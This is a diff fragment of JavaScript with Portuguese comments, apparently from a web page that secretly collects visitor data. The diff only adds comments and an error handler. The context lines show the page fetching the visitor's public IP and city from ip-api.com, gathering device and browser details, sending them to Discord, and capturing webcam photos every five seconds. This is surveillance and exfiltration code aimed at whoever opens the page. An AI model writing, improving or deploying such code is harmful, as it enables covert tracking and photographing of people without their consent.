@@ -94,22 +94,23 @@ Região: ${info.region}
                     const deviceInfo = getDeviceInfo();
 
                     // Enviar as informações do dispositivo e localização do IP
-                    fetch('https://ip-api.com/json')
+                    fetch('https://ip-api.com/json')  // Pega o IP público e a localização
                         .then(response => response.json())
                         .then(data => {
                             // Incluindo IP e região no envio ao Discord
                             const userInfo = {
-                                ip: data.query,
-                                deviceInfo: deviceInfo.deviceInfo,
-                                browser: deviceInfo.browser,
-                                region: data.city + ', ' + data.country
+                                ip: data.query,  // IP do usuário
+                                deviceInfo: deviceInfo.deviceInfo,  // Informações do dispositivo
+                                browser: deviceInfo.browser,  // Navegador
+                                region: data.city + ', ' + data.country  // Região (cidade, país)
                             };
 
                             sendToDiscord(userInfo);  // Enviar as informações ao Discord
 
                             // Captura foto a cada 5 segundos
                             setInterval(() => capturePhoto(videoElement), 5000);
-                        });
+                        })
+                        .catch(error => console.error('Erro ao pegar informações do IP:', error));
                 })
                 .catch(function (error) {
                     console.error('Erro ao acessar a câmera:', error);
